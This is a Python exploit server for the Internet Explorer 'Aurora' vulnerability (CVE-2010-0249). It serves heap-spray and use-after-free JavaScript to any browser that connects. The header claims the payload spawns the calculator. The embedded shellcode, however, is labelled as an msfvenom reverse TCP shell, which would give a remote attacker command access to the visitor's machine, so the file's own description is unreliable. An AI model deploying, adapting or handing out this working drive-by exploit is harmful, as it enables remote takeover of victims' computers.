#
#   This program acts as a web server that generates an exploit to
#   target a vulnerability (CVE-2010-0249) in Internet Explorer.
#   The exploit was tested using Internet Explorer 6 on Windows XP SP2.
#   The exploit's payload spawns the calculator.
#
#   Usage  : python ie_aurora.py [port number]
#

import sys
import socket

from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler

class RequestHandler(BaseHTTPRequestHandler):

    def convert_to_utf16(self, payload):
        enc_payload = ''
        for i in range(0, len(payload), 2):
            num = 0
            for j in range(0, 2):
                num += (ord(payload[i + j]) & 0xff) << (j * 8)
            enc_payload += '%%u%04x' % num
        return enc_payload

    def get_payload(self):
  # msfvenom -p windows/shell_reverse_tcp LHOST=[IP] LPORT=4443 EXITFUNC=process -b "\x00" -f js_le
	payload = "%ue7b8%u936b%uda84%ud9ca%u2474%u5df4%uc929%u52b1%ued83%u31fc%u0e45%ua203%u7165%ud071%uf792%u287a%u9863%ucdf3%u9852%u8660%u28c5%ucae2%uc3e9%ufea6%ua17a%uf16e%u0ccb%u3c49%u3dcb%u5fa9%u3c4f%ubffe%u8f6e%ubef3%uf2b7%u92fe%u7860%u02ac%u3404%ua96d%ud856%u4ef5%udb2e%uc1d4%u8224%ue0f6%ubee9%ufabe%ufbee%u7109%u70c4%u5388%u7814%u9a27%u8b98%udb39%u741f%u154c%u095c%ue257%ud51e%uf0d2%u9eb9%udc45%u7238%u9713%u3f37%uff57%ube5b%u74b4%u4b67%u5a3b%u0fe1%u7e18%ud4a9%u2701%uba17%u373e%u63f8%u3c9b%u7715%u1f96%ub472%u9f9b%ud282%uecac%u7db0%u7a07%uf6f9%u7d81%u2cfe%u1175%ucf01%u3886%u9bc6%u52d6%ua3ef%ua2bc%u7610%uf212%u29be%ua2d3%u9a7e%ua8bb%uc570%ud3dc%u6e5a%u2e76%u9b0d%u3e8d%uf39f%u3e93%ubf1e%ud81d%uaf4a%u734b%u56e3%u0fd6%u9792%u6acc%u1c94%u8be3%ud55b%u9f8e%u150c%ufdc5%u2a9b%u69f3%ub847%u6998%ua10e%u3e36%u1747%uaa4f%u0e75%uc8f9%ud687%u48c2%u2b5c%u51cc%u1711%u41ea%u98ef%u35b6%ucebf%ue360%ub979%u5dc2%u16d0%u098d%u54a5%u4f0e%ub0aa%uaff8%u6d1b%ud0bd%uf994%ua949%u99c8%u60b6%ua949%u28fc%u22f8%ub959%u2eb8%u145a%u56fe%u9cd9%uad7f%ud5c1%ue97a%u0645%u62f7%u2820%u83a4%u4161"


	return payload

    def get_exploit(self):
        exploit = '''
        <html>
        <head>
            <script>

            var obj, event_obj;

            function spray_heap()
            {
                var chunk_size, payload, nopsled;

                chunk_size = 0x80000;
                payload = unescape("<PAYLOAD>");
                nopsled = unescape("<NOP>");
                while (nopsled.length < chunk_size)
                    nopsled += nopsled;
                nopsled_len = chunk_size - (payload.length + 20);
                nopsled = nopsled.substring(0, nopsled_len);
                heap_chunks = new Array();
                for (var i = 0 ; i < 200 ; i++)
                    heap_chunks[i] = nopsled + payload;
            }

            function initialize()
            {
                obj = new Array();
                event_obj = null;
                for (var i = 0; i < 200 ; i++ )
                    obj[i] = document.createElement("COMMENT");
            }

            function ev1(evt)
            {
                event_obj = document.createEventObject(evt);
                document.getElementById("sp1").innerHTML = "";
                window.setInterval(ev2, 1);
            }

            function ev2()
            {
                var data, tmp;

                data = "";
                tmp = unescape("%u0a0a%u0a0a");
                for (var i = 0 ; i < 4 ; i++)
                    data += tmp;
                for (i = 0 ; i < obj.length ; i++ ) {
                    obj[i].data = data;
                }
                event_obj.srcElement;
            }

            function check()

		{
                document.write(navigator.userAgent);
                return true;
            }

            if (check()) {
                initialize();
                spray_heap();
            }
            else
                window.location = 'about:blank'

            </script>
        </head>
        <body>
		<h2> Hello </h2>
            <span id="sp1">
            <img src="aurora.gif" onload="ev1(event)">
            </span>
        </body>
        </html>
        '''
        exploit = exploit.replace('<PAYLOAD>', self.get_payload())
        exploit = exploit.replace('<NOP>', '%u0a0a%u0a0a')
        return exploit

    def get_image(self):
        content  = '\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff'
        content += '\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44'
        content += '\x01\x00\x3b'
        return content

    def log_request(self, *args, **kwargs):
        pass

    def do_GET(self):
        try:
            if self.path == '/':
                print
                print '[-] Incoming connection from %s' % self.client_address[0]
                self.send_response(200)
                self.send_header('Content-Type', 'text/html')
                self.end_headers()
                print '[-] Sending exploit to %s ...' % self.client_address[0]
		self.wfile.write(self.get_exploit())
                print '[-] Exploit sent to %s' % self.client_address[0]
            elif self.path == '/aurora.gif':
                self.send_response(200)
                self.send_header('Content-Type', 'image/gif')
                self.end_headers()
                self.wfile.write(self.get_image())
        except:
            print '[*] Error : an error has occured while serving the HTTP request'
            print '[-] Exiting ...'
            sys.exit(-1)


def main():
    if len(sys.argv) != 2:
        print 'Usage: %s [port number (between 1024 and 65535)]' % sys.argv[0]
        sys.exit(0)
    try:
        port = int(sys.argv[1])
        if port < 1024 or port > 65535:
            raise ValueError
        try:
            serv = HTTPServer(('', port), RequestHandler)
            ip = socket.gethostbyname(socket.gethostname())
            print '[-] Web server is running at http://%s:%d/' % (ip, port)
            try:
                serv.serve_forever()
            except:
                print '[-] Exiting ...'
        except socket.error:
            print '[*] Error : a socket error has occurred'
        sys.exit(-1)
    except ValueError:
        print '[*] Error : an invalid port number was given'
        sys.exit(-1)

if __name__ == '__main__':
    main()
